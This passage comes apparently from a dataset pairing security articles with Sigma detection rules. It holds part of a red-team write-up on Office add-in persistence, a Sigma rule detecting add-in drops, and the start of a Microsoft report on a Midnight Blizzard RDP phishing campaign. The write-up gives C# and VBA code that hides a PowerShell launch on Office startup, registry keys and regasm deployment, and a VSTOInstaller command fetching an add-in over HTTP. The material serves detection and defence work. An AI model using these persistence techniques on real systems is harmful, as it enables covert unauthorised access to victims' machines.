location:\n\n```\nHKEY_CURRENT_USER\\Software\\Microsoft\\Office\\15.0\\PowerPoint\\AddIns\\<AddInName>\n```\n\nNote that the Office number may also need to be changed, and the 15.0 here refers to Office 2013. This key should then have the following properties. “Autoload” is set to “1” to indicate that it should load the add-in automatically when PowerPoint starts. A full “Path” to the add-in does not need to be provided as PowerPoint is aware of the location it is required to load add-ins from.\n\n```image\nAlt: VBA-PP-1\nDescription: The image displays a screenshot of the Windows Registry Editor, specifically a section related to PowerPoint add-ins. It shows the registry path for an add-in named 'InconspicuousAddIn.ppam' under the 'AddIns' directory. The registry keys include '(Default)', 'AutoLoad', and 'Path', with 'AutoLoad' set to '1', indicating that the add-in is configured to load automatically when PowerPoint starts. The structure and values depicted provide technical details relevant to configuring PowerPoint VBA add-ins.\nTranscription: |\n  Outlook\n    PowerPoint\n      AddInLoadTimes\n      AddIns\n        InconspicuousName\n  \n  Name          Type        Data\n  (Default)     REG_SZ      (value not set)\n  AutoLoad      REG_DWORD   0x00000001 (1)\n  Path          REG_SZ      InconspicuousAddIn.ppam\n```\n\n#### Benefits\n\n1. No administrative rights needed.\n2. Automatically loaded for Excel.\n3. \"Trusted Location\" so there are no problems executing VBA.\n4. Despite the file type being an “Add-In”, the “Disable all Application Add-Ins” option does not prevent the VBA code from executing.\n5. You can password protect the Add-In for viewing and editing – but it will still be executed.\n6. It can potentially be used for persistence in VDI environments.\n\n#### Disadvantages\n\n1. Having to endure the excruciating process of writing VBA code.\n2. In the case of PowerPoint VBA Add-Ins having to write to the registry.\n3. Dropping additional files to disk for both Excel and PowerPoint.\n\n## Office COM Add-Ins\n\nA wholly different way to create add-ins for Office is “COM add-ins”. Due to the manner in which COM add-ins work, it is possible to create a single add-in and have this integrated into all Office applications (including Outlook). For example, to run code when such Office programs open.\n\nCOM objects (which are stored as “*.dll” files, although are different from traditional DLLs) must be registered (in the registry) before use. Primarily this involves notifying Windows about the COM object (i.e., setting it up in the HKEY_CLASSES_ROOT hive). This registration process is defined in the function specified with a “ComRegisterFunctionAttribute” attribute.\n\nOffice applications must then be further configured to use this COM object which involves creating a single registry key with three properties. This key must be created per application. The registry key required to tell an Office program to load the COM add-in is stored at:\n\n```\nHKEY_CURRENT_USER\\Software\\Microsoft\\Office\\<Program>\\Addins\\<AddInName>\n```\n\nIn this example, “3” for “LoadBehaviour” specifies that the Office application (here Outlook) should load the COM add-in at startup, and the COM add-in is referenced through a “FriendlyName”.\n\n```image\nAlt: COM-1\nDescription: The image displays a registry editor view showcasing the registry keys related to COM add-ins for Outlook. On the left side, it shows the 'Addins' folder with entries for various add-ins, including 'InconspicuousAddIn.Connect'. The right side displays the details of the selected add-in, including its 'Description', 'FriendlyName', and 'LoadBehavior' values, which indicate how the add-in is configured to behave within Outlook. This image is relevant to the context as it illustrates the registry settings necessary for deploying COM add-ins.\nTranscription: |\n  Outlook\n    Addins\n      AccessAddin.DC\n      ColleagueImport.ColleagueImportAddin\n      InconspicuousAddin.Connect\n      TelemetryAddin.Connect\n  \n  Name                  Type        Data\n  (Default)             REG_SZ      (value not set)\n  Description           REG_SZ      Outlook Inconspicuous Addin\n  FriendlyName          REG_SZ      Outlook Inconspicuous Addin\n  LoadBehavior          REG_DWORD   0x00000003 (3)\n```\n\nThe creation of the Office application keys can also be performed within the same function that is handling COM registration. A key benefit of this is allowing the actions to deploy the persistence mechanism to be bundled together thus reducing the number of commands that need to be run to set it up – in this case one using “regasm.exe”.\n\nWith regards to getting code execution once an Office application loads the COM object, a good location for this in the code is in the \"OnConnection\" function of the Office-specific \"IDTExtensibility2\" interface. This interface deals with add-in related events, such as for when an add-in is loaded (as with \"OnConnection\") and unloaded. The example below shows a hidden cmd window spawning calc.\n\n```\npublic void OnConnection(object application, Extensibility.ext_ConnectMode connectMode, object addInInst, ref System.Array custom)\n{\n    /* snip */\n    System.Diagnostics.Process process = new System.Diagnostics.Process();\n    System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();\n    startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;\n    startInfo.FileName = \"powershell.exe\";\n    startInfo.Arguments = \"-ep bypass -C calc\";\n    process.StartInfo = startInfo;\n    process.Start();\n}\n```\n\nOnce the COM add-in has been created it can be deployed as follows using regasm.exe which invokes the registration function. This action requires administrative privileges as it writes to HKEY_CLASSES_ROOT.\n\n```image\nAlt: COM-3\nDescription: The image depicts a command prompt window displaying the output of a command used to register a .NET assembly with the Regasm utility. It shows the command executed, along with a warning indicating that registering an unsigned assembly may interfere with other applications. The output confirms that types were registered successfully. The command prompt is titled 'Administrator: Command Prompt', indicating it was run with administrative privileges.\nTranscription: |\n  C:\\>C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe\" /codebase \"C:\\Users\\wk\\AppData\\Roaming\\Microsoft\\Office\\InconspicuousCOMAddIn.dll\"\n  \n  Microsoft .NET Framework Assembly Registration Utility version 4.0.30319.33440\n  for Microsoft .NET Framework version 4.0.30319.33440\n  Copyright (C) Microsoft Corporation. All rights reserved.\n  \n  RegAsm : warning RA0000 : Registering an unsigned assembly with /codebase can cause your assembly to interfere with\n  other applications that may be installed on the same computer. The /codebase switch is intended to be used only with\n  signed assemblies. Please give your assembly a strong name and re-register it.\n  \n  Types registered successfully\n```\n\nIn the example presented above, the add-in will be loaded when Outlook opens and we’ll be presented with calc.\n\n#### Benefits\n\n1. Easy to create a single add-in that works across multiple Office products without adaptation.\n2. One command to setup (regasm).\n\n#### Disadvantages\n\n1. Dropping the COM \"*.dll\" file to disk, and the registry edits required for it to be registered and automatically loaded.\n2. Requires administrative rights for COM registration.\n3. Unlikely to be useful for persistence in VDI environments.\n\n## Excel Automation Add-In\n\nAs part of its intention to be extensible Excel allows the creation of user-defined functions. Such functions would be executed, for example, as part of cell formulae (where “=SUM()” is an example of a built-in function). These user-defined functions are stored in what is known as “Automation Add-Ins”. They’re created in a similar manner to COM Add-Ins, but have this specific use case.\n\nThere is a registration function as usual with COM, which can also include code to set up the registry to notify Excel that it should load this add-in at run time. This key required is located at:\n\n```\nHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\\15.0\\Excel\\Options\n```\n\nEach Automation add-in is listed as the value of a single “OPENx” property, where x is an incrementing number if multiple add-ins are enabled at one time.\n\n```image\nAlt: AUTO1\nDescription: The image displays a screenshot of a Windows Registry Editor window showing the registry path related to Excel add-ins. It specifically highlights the 'Options' section under 'Excel' where an entry for 'OPEN' is listed. This entry indicates a user-defined function under the name 'InconspicuousAddIn.ExtFunctions'. The screenshot provides a visual representation of the registry settings that facilitate the use of Automation Add-Ins in Excel, making it relevant to the topic of persistence mechanisms.\nTranscription: |\n  plaintext\n  Excel\n    AddInLoadTimes\n    File MRU\n    Options\n    Place MRU\n  \n  Name           Type        Data\n  (Default)      REG_SZ      (value not set)\n  FirstRun       REG_DWORD   0x00000000 (0)\n  OPEN           REG_SZ      /A \"InconspicuousAddIn.ExtFunctions\"\n  OptionFormat   REG_BINARY  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n```\n\nIn terms of getting an Automation add-in to actually do something useful for the purposes of persistence, you define user-defined functions simply as standard functions within a particular namespace (here “InconspicuousAddIn”) and class (here “ExtFunctions”) which gets referenced in the above registry property. The function can do anything a normal function can, including executing arbitrary commands. The example below shows a user-defined function that counts the number of cells in a selected range after it opens calc.\n\n```\npublic double CountCellsRange(object range)\n{\n    System.Diagnostics.Process process = new System.Diagnostics.Process();\n    System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();\n    startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;\n    startInfo.FileName = \"powershell.exe\";\n    startInfo.Arguments = \"-ep bypass -C calc\";\n    process.StartInfo = startInfo;\n    process.Start();\n\n    Excel.Range count = range as Excel.Range;\n    return count.Cells.Count;\n}\n```\n\nTo deploy the persistence mechanism, as Excel Automation add-ins are COM-based, regasm can be used once again using the same syntax as for the COM add-in. As can be seen below, post-regasm, the Automation add-in is now enabled:\n\n```image\nAlt: AUTO2\nDescription: The image shows a dialog box from Microsoft Excel displaying the 'Add-Ins' menu. It highlights the 'InconspicuousAddIn.ExtFunctions' as an enabled automation add-in. The dialog includes a list of available automation servers and indicates the file path for the add-in's DLL. The interface suggests interaction with user-defined functions in Excel, relevant to the context of creating persistence mechanisms using automation add-ins.\nTranscription: |\n  Top Window: Add-Ins\n  \n  Add-Ins available:\n  \n  ☑ Agptest  \n  ☑ Analysis ToolPak  \n  ☑ Analysis ToolPak - VBA  \n  ☑ InconspicuousAddin.ExtFunctions  \n  ☐ ZigZag  \n  \n               [OK] [Cancel] [Browse...] [Automation...]\n  \n  ---\n  \n  **Bottom Window: Automation Servers**\n  \n  _Title:_ **Automation Servers**\n  \n  Automation servers available:\n    HashedData Class\n    HNetCfg.NAT Traversal via UPnP Configuration Manager\n    HtmlDialog Class\n    HtmlDigestHelper Class\n    HNetCfg.FwMgr\n    HNetCfg.FwPolicy2\n    HNetCfg.HNetShare\n    HNetCfg.HNetCfgMgr\n    IETag Factory Class\n    IETag Factory\n    Image Rotation Class\n    IFilterGraph\n    InconspicuousAddin.ExtFunctions\n    Microsoft Uc Configuration Class\n    Microsoft UcDiagControl\n    Microsoft UcDiagControl for UcDiagnosticsInfo2\n    Microsoft UcDiagControl for UcMode category.\n  \n  (v) InconspicuousAddin.ExtFunctions\n  \n  ProgID: InconspicuousAddin.ExtFunctions  \n  C:\\Windows\\SysWow64\\uncscore.dll\n  \n             [OK] [Cancel] [Browse...]\n```\n\nOnce a user-defined function is integrated into Excel, an attacker would still need to find a way to have this command executed. Unfortunately, it doesn’t appear that you can overwrite built-in functions. Moreover, user-defined functions only execute when they are called, and will not execute again if they’ve previously been executed and the result is stored in a document.\n\nThe user-defined function therefore needs to be \"forcefully\" called, which can be done using VBA. This is not ideal, but arguably makes it harder for defenders to detect than when putting a full VBA persistence stager in a template or add-in – it’s less likely to draw suspicion as it could easily be interpreted as a standard Excel function. The following snippet of VBA is an example of how this could be achieved. When the workbook opens, a cell is selected (obviously in practice something other than 1:1 - A1), and its contents are replaced with the text string of the user-defined function call.\n\n```image\nAlt: AUTO3\nDescription: The image displays a snippet of VBA (Visual Basic for Applications) code within the context of an Excel add-in project. It shows a subroutine named 'Workbook_Open()' that sets the formula of a specific cell (A1) in 'Sheet1' to call a user-defined function, 'CountCellsRange(A1:A3)'. This is part of a discussion on how Automation add-ins can be used for persistence in Excel, illustrating how attackers might leverage Excel's functionality to execute arbitrary commands.\nTranscription: |\n  vb\n  Sub Workbook_Open()\n      Worksheets(\"Sheet1\").Cells(1, 1).Formula = \"=CountCellsRange(A1:A3)\"\n  End Sub\n```\n\n#### Benefits\n\n1. One command to setup (regasm).\n\n#### Disadvantages\n\n1. Requires administrative rights for COM registration.\n2. You still need a way of calling the user-defined function.\n3. Unlikely to be useful for persistence in VDI environments.\n\n## VBE Add-Ins\n\nIt is possible to create a persistence mechanism that does not leverage VBA itself, but the development environment for creating it – the VBA editor (VBE). The documentation for creating VBE add-ins is scarce; however, it was found to be based on the now familiar COM object using Office’s \"IDTExtensibility2\" interface. Through this COM object, arbitrary code could be executed on, for example, the launch of the VBA editor. As COM is used once again, it can be deployed using regasm. This deployment includes the creation of the registry key to inform the VBA editor that it should automatically load the add-in. This key is stored at:\n\n```\nHKEY_CURRENT_USER\\Software\\Microsoft\\VBA\\VBE\\6.0\\Addins\\<VBEAddIn.Name>\n```\n\nThe key also contains a number of properties, which include a “FriendlyName” to refer to the registered COM object, and setting “LoadBehaviour” to “3” to inform the VBA editor to launch the add-in when the editor starts.\n\n```image\nAlt: VBE1\nDescription: The image displays a screenshot of a Windows Registry Editor view, showing a specific registry key path related to VBE add-ins in the context of Microsoft Office. It highlights the 'InconspicuousVBEAddIn.Connect' entry under the 'Addins' folder within the registry. The right side of the editor shows various properties associated with this registry entry, including 'CommandLineSafe', 'Description', 'FriendlyName', and 'LoadBehavior'. The 'LoadBehavior' is set to '3', indicating that the add-in is configured to load automatically when the VBA editor starts.\nTranscription: |\n  VBA\n    7.1\n      Trusted\n      VBE\n        6.0\n          Addins\n            InconspicuousVBEAddIn.Connect\n  \n  Name                  Type         Data\n  (Default)             REG_SZ       (value not set)\n  CommandLineSafe       REG_DWORD    0x00000000 (0)\n  Description           REG_SZ       An add-in that does inconspicuous things.\n  FriendlyName          REG_SZ       InconspicuousVBEAddIn\n  LoadBehavior          REG_DWORD    0x00000003 (3)\n```\n\nThe configured add-in can be seen within the VBA editor’s “Add-In Manager”.\n\n```image\nAlt: VBE2\nDescription: The image shows the 'Add-In Manager' interface from the VBA editor, displaying an add-in named 'InconspicuousVBEAddIn'. The add-in is marked as 'Startup / Loaded', indicating that it is configured to load automatically when the VBA editor starts. There is also a description stating, 'An add-in that does inconspicuous things.' The image highlights the options for load behavior, with checkboxes for 'Loaded/Unloaded' and 'Load on Startup' selected.\nTranscription: |\n  Add-In Manager\n  \n  Available Add-Ins                Load Behavior\n  InconspicuousVBEAddIn            Startup / Loaded\n  \n  Description\n  An add-in that does inconspicuous things.\n  \n  Load Behavior\n  [x] Loaded/Unloaded\n  [x] Load on Startup\n  [ ] Command Line\n  \n  [OK] [Cancel] [Help]\n```\n\n#### Benefits\n\n1. Easy to create a single add-in that works across multiple Office products without adaptation.\n2. One command to setup (regasm).\n\n#### Disadvantages\n\n1. Requires users to actually open the VBA editor!\n2. Requires administrative rights for COM registration.\n3. Unlikely to be useful for persistence in VDI environments.\n\n## VSTO Add-Ins\n\nVisual Studio Tools for Office (VSTO) will also be covered here for the purposes of completeness. VSTO is the replacement for COM add-ins in newer versions of Office (although the latter is still supported). Unlike COM add-ins, however, VSTO requires a special runtime to be installed which is not installed by default.\n\nA suitable place for storing persistence commands is the default “ThisAddIn-Startup” function which is configured to handle startup events (e.g., when the module is loaded when the application starts). An example is shown below.\n\n```\nprivate void ThisAddIn_Startup(object sender, System.EventArgs e)\n{\n    System.Diagnostics.Process process = new System.Diagnostics.Process();\n    System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();\n    startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;\n    startInfo.FileName = \"powershell.exe\";\n    startInfo.Arguments = \"-ep bypass -C calc\";\n    process.StartInfo = startInfo;\n    process.Start();\n}\n```\n\nThe problem with VSTO add-ins arises when it comes to deploying them. In part, this is due to the requirement for the special runtime. If this is not installed, and there are minimal requirements to avoid detective security controls (unlikely), it can be installed silently with no user interaction (\"vstor_redist.exe\" in the example below).\n\nThe VSTO add-in (“*.vsto”) can then be installed using a binary (“VSTOInstaller.exe”) which is part of the runtime.\n\n```image\nAlt: VSTO1\nDescription: The image displays a command prompt window showcasing a command for installing the VSTO (Visual Studio Tools for Office) runtime and a specific add-in. The command includes paths to the 'vstor_redist.exe' and 'VSTOInstaller.exe', as well as parameters for a silent installation process. This is relevant for understanding the deployment of VSTO add-ins, as discussed in the accompanying text.\nTranscription: |\n  C:\\>vstor_redist.exe /q /norestart\n  \n  C:\\>\"C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VSTO\\10.0\\VSTOInstaller.exe\" /I \"C:\\VSTO-AddIn\\WordAddIn.vsto\"\n```\n\nUnfortunately, this causes a pop-up requiring the user to confirm the installation. You can add a \"/s\" for silent but the project needs to be signed by a trusted publisher or it will default to “Don't Install” and silently fail.\n\n```image\nAlt: VSTO2\nDescription: The image shows a pop-up window titled 'Microsoft Office Customization Installer.' The window indicates that the publisher of the add-in cannot be verified, raising a security warning. It displays the name of the add-in ('WordAddIn5'), its source file path, and notes that the publisher is 'Unknown Publisher.' The user is prompted with two options: 'Install' and 'Don't Install,' accompanied by a warning that untrusted customizations could harm the computer.\nTranscription: |\n  Microsoft Office Customization Installer\n  \n  Publisher cannot be verified\n  \n  Are you sure you want to install this customization?\n  \n  Name:        WordAddIn5\n  From:        file:///c:/VSTO-AddIn/WordAddIn5.vsto\n  Publisher:   Unknown Publisher\n  \n  While Office customizations can be useful, they can potentially harm your computer. If you do not trust the source, do not install this software. More Information...\n  \n  [Install] [Don't Install]\n```\n\nInterestingly \"VSTOInstaller.exe\" is a Microsoft signed binary and the location of the add-in can be specified as a URL (e.g., \"VSTOInstaller.exe /s /i http://192.168.7.129/OutlookAddIn1.vsto\"). Initially, this seems interesting as a potential application whitelisting bypass if a signed VSTO add-in is used. Unfortunately, Window’s trust model would restrict this. Although a user (or at least the organisation’s system administration team) may trust many certification authorities within the “Trusted Root” store, this trust is not implicitly extended to allow them to “publish” updates to software, and instead, there is a separate “Trusted Publisher” store for this which certification authorities have to be explicitly enabled in.\n\n#### Benefits\n\n1. Runtime installer (\"VSTOInstaller.exe\") is an MS signed binary, and can download (silently) the add-in over HTTP, although it needs to be from a trusted publisher.\n\n#### Disadvantages\n\n1. Requires non-standard VSTO runtime.\n2. Can't install silently without being signed by a trusted publisher, although a user might manually install it given that it’s an add-in for a trusted program.\n3. Unlikely to be useful for persistence in VDI environments.\n\n## Defending Against Malicious Add-Ins\n\nMalicious XLL, COM, Automation, and VSTO add-ins can easily be prevented through disabling add-ins within each Office application’s Trust Center (or through the appropriate registry keys).\n\n```image\nAlt: DEF1\nDescription: The image is a screenshot of the Trust Center settings in a Microsoft Office application. It shows the options available for managing add-ins, specifically highlighting the option to 'Disable all Application Add-ins (may impair functionality)' which is currently checked. The panel also includes options related to trusted publishers, trusted locations, and notifications for unsigned add-ins.\nTranscription: |\n  Trust Center\n  \n  Add-ins\n  \n  [ ] Require Application Add-ins to be signed by Trusted Publisher\n  \n  [ ] Disable notification for unsigned add-ins (code will remain disabled)\n  \n  [x] Disable all Application Add-ins (may impair functionality)\n```\n\nAlternatively, if add-ins are required, it is recommended they are required to be signed by a trusted publisher, and that user notifications are disabled. The user notifications that are presented when untrusted add-ins are used provide limited warning against potential security risk, and users may enable the content, especially if they’re opening a previously trusted document (e.g., one they’ve created). An example of a user notification is provided below.\n\n```image\nAlt: DEF2\nDescription: The image displays a security warning message from a Microsoft Office application. It indicates that some active content has been disabled and prompts the user to enable content for further interaction. This warning is relevant to the context of malicious add-ins, highlighting the importance of user awareness regarding the potential risks of enabling such content.\nTranscription: |\n  FILE  HOME  INSERT  DESIGN  PAGE LAYOUT  REFERENCES  MAILINGS  REVIEW  VIEW\n  \n  SECURITY WARNING  Some active content has been disabled. Click for more details.  Enable Content\n```\n\nAlthough the WLL and VBA add-ins self-define as add-ins, they’re not affected by the above Trust Center setting. This is particularly surprising in the case of WLL add-ins given it’s a DLL-based add-in.\n\nThe most effective way to mitigate against the risk of malicious WLL and VBA add-ins is to remove the “StartUp” trusted locations for each if they are not used. If they are required, at least for Excel and PowerPoint consider putting the required add-ins in the system-wide trusted location for this purpose, and removing the trusted location that exists within the user profile. This would force an attacker to escalate their privileges in order to use the system-wide location as a persistence mechanism. In both cases, organisations could also look to ensure that appropriate access control lists are established for the trusted locations in order to prevent users from adding or editing existing files.\n\nIt is further recommended that organisations look to develop a detective capability around identifying malicious add-ins. Three core aspects to this involve examining and validating the file system contents of the trusted locations, auditing the registry entries relevant for enabling add-ins, and monitoring for non-standard process relationships (e.g., examining the processes spawned by Office applications).",
    "sigma_rule": {
      "title": "Potential Persistence Via Microsoft Office Add-In",
      "id": "8e1cb247-6cf6-42fa-b440-3f27d57e9936",
      "status": "test",
      "description": "Detects potential persistence activity via startup add-ins that load when Microsoft Office starts (.wll/.xll are simply .dll fit for Word or Excel).",
      "references": [
        "Internal Research",
        "https://labs.withsecure.com/publications/add-in-opportunities-for-office-persistence",
        "https://github.com/redcanaryco/atomic-red-team/blob/4ae9580a1a8772db87a1b6cdb0d03e5af231e966/atomics/T1137.006/T1137.006.md"
      ],
      "author": "NVISO",
      "date": "2020-05-11",
      "modified": "2023-02-08",
      "tags": [
        "attack.persistence",
        "attack.t1137.006"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows"
      },
      "detection": {
        "selection_wlldropped": {
          "TargetFilename|contains": "\\Microsoft\\Word\\Startup\\",
          "TargetFilename|endswith": ".wll"
        },
        "selection_xlldropped": {
          "TargetFilename|contains": "\\Microsoft\\Excel\\Startup\\",
          "TargetFilename|endswith": ".xll"
        },
        "selection_xladropped": {
          "TargetFilename|contains": "Microsoft\\Excel\\XLSTART\\",
          "TargetFilename|endswith": ".xlam"
        },
        "selection_generic": {
          "TargetFilename|contains": "\\Microsoft\\Addins\\",
          "TargetFilename|endswith": [
            ".xlam",
            ".xla",
            ".ppam"
          ]
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Legitimate add-ins"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_office_addin_persistence.yml",
    "id": "864"
  },
  {
    "url": "https://www.microsoft.com/en-us/security/blog/2024/10/29/midnight-blizzard-conducts-large-scale-spear-phishing-campaign-using-rdp-files/",
    "markdown": "# Midnight Blizzard conducts large-scale spear-phishing campaign using RDP files\n\n**Published on October 29, 2024**\n\nSince October 22, 2024, Microsoft Threat Intelligence has observed Russian threat actor Midnight Blizzard sending a series of highly targeted spear-phishing emails to individuals in government, academia, defense, non-governmental organizations, and other sectors. This activity is ongoing, and Microsoft will continue to investigate and provide updates as available. Based on our investigation of previous Midnight Blizzard spear-phishing campaigns, we assess that the goal of this operation is likely intelligence collection. Microsoft is releasing this blog to notify the public and disrupt this threat actor activity. This blog provides context on these external spear-phishing attempts, which are common attack techniques and do not represent any new compromise of Microsoft.\n\nThe spear-phishing emails in this campaign were sent to thousands of targets in over 100 organizations and contained a signed Remote Desktop Protocol (RDP) configuration file that connected to an actor-controlled server. In some of the lures, the actor attempted to add credibility to their malicious messages by impersonating Microsoft employees. The threat actor also referenced other cloud providers in the phishing lures.\n\nWhile this campaign focuses on many of Midnight Blizzard’s usual targets, the use of a signed RDP configuration file to gain access to the targets’ devices represents a novel access vector for this actor. Overlapping activity has also been reported by the Government Computer Emergency Response Team of Ukraine (CERT-UA) under the designation UAC-0215 and also by Amazon.\n\nMidnight Blizzard is a Russian threat actor attributed by the United States and United Kingdom governments to the Foreign Intelligence Service of the Russian Federation, also known as the SVR. This threat actor is known to primarily target governments, diplomatic entities, non-governmental organizations (NGOs), and IT service providers, primarily in the United States and Europe. Its focus is to collect intelligence through longstanding and dedicated espionage of foreign interests that can be traced to early 2018. Its operations often involve compromise of valid accounts and, in some highly targeted cases, advanced techniques to compromise authentication mechanisms within an organization to expand access and evade detection.\n\nMidnight Blizzard is consistent and persistent in its operational targeting, and its objectives rarely change. It uses diverse initial access methods, including spear phishing, stolen credentials, supply chain attacks, compromise of on-premises environments to laterally move to the cloud, and leveraging service providers’ trust chain to gain access to downstream customers. Midnight Blizzard is known to use the Active Directory Federation Service (AD FS) malware known as FOGGYWEB and MAGICWEB. Midnight Blizzard is identified by peer security vendors as APT29, UNC2452, and Cozy Bear.\n\nAs with any observed nation-state actor activity, Microsoft is in the process of directly notifying customers that have been targeted or compromised, providing them with the necessary information to secure their accounts. Strong anti-phishing measures will help to mitigate this threat. As part of our commitment to helping protect against cyber threats, we provide indicators of compromise (IOCs), hunting queries, detection details, and recommendations at the end of this post.\n\n## Spear-phishing campaign\n\nOn October 22, 2024, Microsoft identified a spear-phishing campaign in which Midnight Blizzard sent phishing emails to thousands of users in over 100 organizations. The emails were highly targeted, using social engineering lures relating to Microsoft, Amazon Web Services (AWS), and the concept of Zero Trust. The emails contained a Remote Desktop Protocol (RDP) configuration file signed with a LetsEncrypt certificate. RDP configuration (.RDP) files summarize automatic settings and resource mappings that are established when a successful connection to an RDP server occurs. These configurations extend features and resources of the local system to a remote server, controlled by the actor.\n\nIn this campaign, the malicious .RDP attachment contained several sensitive settings that would lead to significant information exposure. Once the target system was compromised, it connected to the actor-controlled server and bidirectionally mapped the targeted user’s local device’s resources to the server. Resources sent to the server may include, but are not limited to, all logical hard disks, clipboard contents, printers, connected peripheral devices, audio, and authentication features and facilities of the Windows operating system, including smart cards. This access could enable the threat actor to install malware on the target’s local drive(s) and mapped network share(s), particularly in AutoStart folders, or install additional tools such as remote access trojans (RATs) to maintain access when the RDP session is closed. The process of establishing an RDP connection to the actor-controlled system may also expose the credentials of the user signed in to the target system.\n\n```image\nAlt: Figure 1. Malicious remote connection\nDescription: The image displays two dialog boxes from a RemoteApp program. The top box shows a loading screen indicating that an app is starting, with a progress bar labeled 'AWS Secure Storage Connection Stability T...'. The bottom box prompts the user with a security warning asking if they trust the publisher of the RemoteApp program, detailing the publisher, path, and remote computer information. It suggests caution, stating that the program could potentially harm the local or remote computer.\nTranscription: |\n  Starting your app\n  AWS Secure Storage Connection Stability T...\n  \n  [Progress Bar]\n  \n  [Button: Cancel]\n  \n  ---\n  \n  Do you trust the publisher of this RemoteApp program?\n  \n  This RemoteApp program could harm your local or remote computer. Make sure that you trust the publisher before you connect to this program.\n  \n  Publisher: [Redacted]\n  Type: RemoteApp program\n  Path: AWS Secure Storage Connection Stability Test v240...\n  Remote computer: [Redacted]\n  \n  [Checkbox: Don't ask me again for remote connections from this publisher]\n  \n  [Button: Connect] [Button: Cancel]\n```\n\n### RDP connection\n\nWhen the target user opened the .RDP attachment, an RDP connection was established to an actor-controlled system. The configuration of the RDP connection then allowed the actor-controlled system to discover and use information about the target system, including:\n\n- Files and directories\n- Connected network drives\n- Connected peripherals, including smart cards, printers, and microphones\n- Web authentication using Windows Hello, passkeys, or security keys\n- Clipboard data\n- Point of Service (also known as Point of Sale or POS) devices\n\n### Targets\n\nMicrosoft has observed this campaign targeting governmental agencies, higher education, defense, and non-governmental organizations in dozens of countries, but particularly in the United Kingdom, Europe, Australia, and Japan. This target set is consistent with other Midnight Blizzard phishing campaigns.\n\n### Email infrastructure\n\nMidnight Blizzard sent the phishing emails in this campaign using email addresses belonging to legitimate organizations that were gathered during previous compromises. The domains used are listed in the IOC section below.\n\n## Mitigations\n\nMicrosoft recommends the following mitigations to reduce the impact of this threat.\n\n### Strengthen operating environment configuration\n\n- Utilize Windows Firewall or Windows Firewall with Advanced Security to help prevent or restrict outbound RDP connection attempts to external or public networks.\n- Require multifactor authentication (MFA). Implementation of MFA remains an essential pillar in identity security and is highly effective at stopping a variety of threats.\n- Leverage phishing-resistant authentication methods such as FIDO Tokens, or Microsoft Authenticator with number matching. Avoid telephony-based MFA methods to avoid risks associated with SIM-jacking.\n- Implement Conditional Access authentication strength to require phishing-resistant authentication for employees and external users for critical apps.\n- Encourage users to use Microsoft Edge and other web browsers that support Microsoft Defender SmartScreen, which identifies and helps block malicious websites, including phishing sites, scam sites, and sites that host malware.\n\n### Strengthen endpoint security configuration\n\nIf you are using Microsoft Defender for Endpoint take the following steps:\n\n- Ensure tamper protection is turned on in Microsoft Defender for Endpoint.\n- Turn on network protection in Microsoft Defender for Endpoint.\n- Turn on web protection.\n- Run endpoint detection and response (EDR) in block mode so that Microsoft Defender for Endpoint can help block malicious artifacts, even when your non-Microsoft antivirus does not detect the threat or when Microsoft Defender Antivirus is running in passive mode. EDR in block mode works behind the scenes to help remediate malicious artifacts that are detected post-breach.\n- Configure investigation and remediation in full automated mode to let Microsoft Defender for Endpoint take immediate action on alerts to help resolve breaches, significantly reducing alert volume.\n- Microsoft Defender XDR customers can turn on the following attack surface reduction rules to help prevent common attack techniques used by threat actors.\n  - Block executable content from email client and webmail.\n  - Block executable files from running unless they meet a prevalence, age, or trusted list criterion.\n\n### Strengthen antivirus configuration\n\n- Turn on cloud-delivered protection in Microsoft Defender Antivirus, or the equivalent for your antivirus product, to help cover rapidly evolving attacker tools and techniques. Cloud-based machine learning protections help block a majority of new and unknown variants.\n- Enable Microsoft Defender Antivirus scanning of downloaded files and attachments.\n- Enable Microsoft Defender Antivirus real-time protection.\n\n### Strengthen Microsoft Office 365 configuration\n\n- Turn on Safe Links and Safe Attachments for Office 365.\n- Enable Zero-hour auto purge (ZAP) in Office 365 to help quarantine sent mail in response to newly acquired threat intelligence and retroactively neutralize malicious phishing, spam, or malware messages that have already been delivered to mailboxes.\n\n### Strengthen email security configuration\n\n- Invest in advanced anti-phishing solutions that monitor incoming emails and visited websites. For example, Microsoft Defender for Office 365 merges incident and alert management across email, devices, and identities, centralizing investigations for email-based threats. Organizations can also leverage web browsers that automatically identify and help block malicious websites, including those used in phishing activities.\n- If you are using Microsoft Defender for Office 365, configure it to recheck links on click. Safe Links provides URL scanning and rewriting of inbound email messages in mail flow, and time-of-click verification of URLs and links in email messages, other Microsoft 365 applications such as Teams, and other locations such as SharePoint Online. Safe Links scanning occurs in addition to the regular anti-spam and anti-malware protection in inbound email messages in Microsoft Exchange Online Protection (EOP). Safe Links scanning can help protect an organization from malicious links used in phishing and other attacks.\n- If you are using Microsoft Defender for Office 365, use the Attack Simulator in Microsoft Defender for Office 365 to run realistic, yet safe, simulated phishing and password attack campaigns. Run spear-phishing (credential harvest) simulations to train end-users against clicking URLs in unsolicited messages and disclosing credentials.\n\n### Conduct user education\n\n- Robust user education can help mitigate the threat of social engineering and phishing emails. Companies should have a user education program that highlights how to identify and report suspicious emails.\n\n## Microsoft Defender XDR detections\n\n### Microsoft Defender for Endpoint\n\nThe following alerts may also indicate threat activity associated with this threat. These alerts, however, can be triggered by unrelated threat activity and are not monitored in the status cards provided with this report.\n\n- Midnight Blizzard Actor activity group\n- Suspicious RDP session\n\n### Microsoft Defender Antivirus\n\nMicrosoft Defender Antivirus detects at least some of the malicious .RDP files as the following signature:\n\n- Backdoor:Script/HustleCon.A\n\n### Microsoft Defender for Cloud\n\nThe following alerts may also indicate threat activity associated with this threat. These alerts, however, can be triggered by unrelated threat activity and are not monitored in the status cards provided with this report.\n\n- Communication with 